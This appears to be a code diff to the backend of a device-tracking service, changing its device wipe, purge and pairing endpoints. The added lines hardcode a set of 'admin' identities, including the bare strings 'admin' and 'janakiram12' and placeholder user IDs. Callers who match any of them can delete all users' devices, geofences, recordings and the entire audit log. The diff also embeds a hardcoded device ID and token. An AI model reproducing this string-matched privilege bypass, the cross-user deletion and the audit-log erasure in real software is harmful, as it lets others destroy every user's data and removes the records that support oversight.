@@ -31,6 +31,7 @@ def list_devices(
     else:
         devices = db.query(Device).filter(Device.user_id == current_user.id).all()
 
+
     now = datetime.now(timezone.utc)
     for dev in devices:
         if dev.last_heartbeat:
@@ -113,7 +114,11 @@ def wipe_all_devices(
     from app.models.geofence import GeofenceEvent
     from app.models.audit import AuditLog
 
-    devices = db.query(Device).filter(Device.user_id == current_user.id).all()
+    ADMIN_ACCOUNTS = {"founder@theft.in", "janakiram12", "admin"}
+    if current_user.email in ADMIN_ACCOUNTS or current_user.id in {"founder-ceo-uuid", "janakiram12-user-uuid", "default-admin-uuid"}:
+        devices = db.query(Device).all()
+    else:
+        devices = db.query(Device).filter(Device.user_id == current_user.id).all()
     dev_ids = [d.id for d in devices]
 
     if dev_ids:
@@ -406,8 +411,8 @@ def auto_pair_device(
         )
 
     # 1. Reuse existing canonical permanent device or user device if present
-    PERMANENT_DEVICE_ID = "f2937e98-ba61-4ffb-8653-101d88015589"
-    PERMANENT_DEVICE_TOKEN = "3e84ecdb-cc16-451c-bd1a-7cca4d3ec34d"
+    PERMANENT_DEVICE_ID = "fbda52ab-478c-416f-876a-6558e77c7726"
+    PERMANENT_DEVICE_TOKEN = "2f7d61ab-2030-48f7-926b-7200db7647db"
     device = db.query(Device).filter(
         (Device.id == PERMANENT_DEVICE_ID) | (Device.user_id == user.id)
     ).first()
@@ -466,7 +471,12 @@ def purge_all_devices(
     from app.models.audio_recording import AudioRecording
     from app.models.video_recording import VideoRecording
 
-    devices = db.query(Device).filter(Device.user_id == current_user.id).all()
+    ADMIN_ACCOUNTS = {"founder@theft.in", "janakiram12", "admin"}
+    is_admin = current_user.email in ADMIN_ACCOUNTS or current_user.id in {"founder-ceo-uuid", "janakiram12-user-uuid", "default-admin-uuid"}
+    if is_admin:
+        devices = db.query(Device).all()
+    else:
+        devices = db.query(Device).filter(Device.user_id == current_user.id).all()
     dev_ids = [d.id for d in devices]
 
     if dev_ids:
@@ -477,13 +487,17 @@ def purge_all_devices(
         db.query(VideoRecording).filter(VideoRecording.device_id.in_(dev_ids)).delete(synchronize_session=False)
         db.query(Device).filter(Device.id.in_(dev_ids)).delete(synchronize_session=False)
 
-    user_geofences = db.query(Geofence).filter(Geofence.user_id == current_user.id).all()
+    user_geofences = db.query(Geofence).all() if is_admin else db.query(Geofence).filter(Geofence.user_id == current_user.id).all()
     gf_ids = [g.id for g in user_geofences]
     if gf_ids:
         db.query(GeofenceEvent).filter(GeofenceEvent.geofence_id.in_(gf_ids)).delete(synchronize_session=False)
 
-    db.query(Geofence).filter(Geofence.user_id == current_user.id).delete(synchronize_session=False)
-    db.query(AuditLog).filter(AuditLog.user_id == current_user.id).delete(synchronize_session=False)
+    for g in user_geofences:
+        db.delete(g)
+    if is_admin:
+        db.query(AuditLog).delete(synchronize_session=False)
+    else:
+        db.query(AuditLog).filter(AuditLog.user_id == current_user.id).delete(synchronize_session=False)
     db.commit()
 
     return {"status": "purged", "message": "All devices and historical records have been permanently cleared."}
